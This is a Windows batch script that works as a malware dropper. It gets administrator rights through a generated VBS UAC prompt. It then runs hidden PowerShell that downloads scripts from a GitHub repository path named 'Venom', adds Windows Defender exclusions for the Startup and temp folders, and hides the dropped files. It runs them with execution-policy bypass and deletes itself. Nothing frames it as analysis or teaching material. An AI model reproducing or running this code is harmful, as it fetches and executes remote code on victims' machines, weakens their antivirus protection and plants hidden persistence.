
@echo off
:: BatchGotAdmin
:-------------------------------------
@echo off
:checkAdmin
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    REM Wait and retry if access is still denied
    timeout /t 5 /nobreak >nul
    goto checkAdmin

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer1.ps1 -OutFile BVrAihDwJNvc.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile AmJOwiWzUEbZ.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'


attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"

attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"

powershell powershell.exe -windowstyle hidden -ep bypass "./BVrAihDwJNvc.ps1"

powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"

del IVbaANzwiphH.cmd
